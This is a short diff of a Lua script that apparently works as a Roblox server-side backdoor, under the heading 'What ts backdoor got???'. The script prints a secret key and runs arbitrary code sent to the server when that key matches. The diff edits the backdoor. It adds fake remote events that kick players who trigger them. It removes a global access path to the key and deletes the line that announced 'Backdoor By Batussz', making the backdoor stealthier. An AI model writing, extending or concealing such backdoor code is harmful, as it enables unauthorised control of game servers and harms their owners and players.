@@ -20,7 +20,7 @@ What ts backdoor got???:
 
 --DEBUGGING VARIABLES
 ----------------
-local dbg = false
+local dbg = true
 ----------------
 -- Variables
 local lclKey = ""
@@ -77,6 +77,7 @@ local Settings = {
     NameWhitelist = false,
     Names = {},
     MoreStealth = true,
+    
     ServicesToCheck = {
         workspace,
         g.Lighting,
@@ -89,10 +90,8 @@ local Settings = {
 -- Additional Features
 if Settings.Universal == false then
     lclKey = "batussz"..math.random(1000000, 9999999)
-    _G._ = lclKey
     local KeyShower = Instance.new("ObjectValue", workspace)
     KeyShower.Name = lclKey
-    _G["rc"] = function() return _G._ end
     print("Your code: >> "..lclKey.." <<\n[Use this code to execute script on Server-Side.]")
 end
 
@@ -101,6 +100,11 @@ if Settings.FakeRemotes == true then
         local rand = math.random(1, #Settings.FakeRemoteSettings.FakeRemoteNames)
         local FakeEvent = Instance.new("RemoteEvent", Settings.FakeRemoteSettings.Service)
         FakeEvent.Name = Settings.FakeRemoteSettings.FakeRemoteNames[rand]
+        
+        FakeEvent.OnServerEvent:Connect(function(plr)
+            plr:Kick()
+        end)
+        
     end
 end
 
@@ -158,7 +162,7 @@ function SearchGameAndAdd()
             if Settings.Universal == true then
                 exec(code)
             elseif Settings.Universal == false then
-                if k == lclKey or k == _G._ then
+                if k == lclKey then
                     exec(code)
                     return
                 else
@@ -241,9 +245,6 @@ else
     Create()
     DetectChange()
 end
-
-print(string.reverse(".detresni yllufsseccus si roodkcaB | zssutaB yB roodkcaB"))
-
 end)
 
 if not success then
